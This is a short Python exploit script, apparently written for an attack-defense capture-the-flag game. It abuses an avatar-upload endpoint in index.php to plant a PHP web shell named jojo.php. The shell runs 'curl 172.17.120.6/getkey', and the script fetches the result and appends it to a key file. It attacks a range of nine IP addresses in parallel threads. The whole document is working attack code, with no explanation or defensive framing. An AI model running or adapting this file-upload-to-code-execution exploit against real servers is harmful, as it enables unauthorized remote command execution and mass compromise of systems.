import requests
import threading


def run(target):
    session = requests.Session()
    paramsGet = {'a': 'saveAvatar', 'type': 'big', 'm': 'Uc', 'photoServer': 'jojo.php', 'g': 'Home'}
    headers = {'Cache-Control': 'max-age=0',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
               'Upgrade-Insecure-Requests': '1',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
               'Connection': 'close', 'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7'}

    try:
        session.get(f'http://{target}/index.php', params=paramsGet, headers=headers)
        response = session.post(f'http://{target}/index.php', params=paramsGet, headers=headers,
                                data="<?php system('curl 172.17.120.6/getkey');?>")
        res = session.get(f'http://{target}/Uploads/avatar_big/jojo.php')
        with open('../CTF/key.txt', 'a+') as f:
            f.write(res.text + '\n')
            print(res.text)

    except Exception as e:
        pass


if __name__ == '__main__':
    targets = []
    ip = '4.4.%s.101'
    for i in range(1, 10):
        targets.append(ip % i)

    for target in targets:
        t = threading.Thread(target=run, args=(target,))
        t.start()
